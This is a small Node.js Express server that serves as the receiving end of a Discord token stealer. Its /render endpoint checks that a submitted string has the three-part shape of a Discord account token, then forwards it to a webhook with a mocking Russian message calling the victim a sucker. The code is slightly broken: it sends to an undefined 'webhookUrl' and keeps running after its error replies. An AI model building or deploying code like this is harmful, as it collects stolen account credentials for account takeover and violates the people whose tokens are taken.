const express = require('express')
const app = express()
const port = process.env.PORT || 3000

const webhook = process.env.webhook || "example.com";

app.post('/render', async (req,res) => {
    if (!req.body) { res.json(JSON.stringify({code: 200, message: 'Твоя мать 200'})) }
    if (!req.body.xyz) { res.json(JSON.stringify({code: 200, message: 'Твоя мать 200'})) }
    if (typeof(req.body.xyz) != "string") { res.json(JSON.stringify({code: 200, message: 'Твоя мать 200'})) }

    const token = req.body.xyz
    const segments = token.split(".")

    if (segments[0].length != 26) { res.json(JSON.stringify({code: 200, message: 'Твоя мать 200'})) }
    if (segments[1].length != 6) { res.json(JSON.stringify({code: 200, message: 'Твоя мать 200'})) }
    if (segments[2].length != 38) { res.json(JSON.stringify({code: 200, message: 'Твоя мать 200'})) }

    const content = '@everyone Новый лох! \n ```' + token + '```'

    const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content })
    })

    res.json(JSON.stringify({code: 200, message: 'хехехехе'}))
})

app.listen(port)
